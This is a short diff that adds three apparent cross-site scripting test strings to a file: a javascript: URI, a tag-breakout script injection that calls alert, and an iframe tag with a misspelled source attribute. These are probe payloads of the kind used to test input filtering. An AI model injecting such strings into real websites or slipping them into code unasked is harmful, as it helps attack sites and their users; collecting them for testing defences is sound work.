@@ -1,0 +1,3 @@
+javascript:alert(1)
+"></script><script>alert(/xss/)</script>
+<iframe scr=http://baidu.com></iframe>
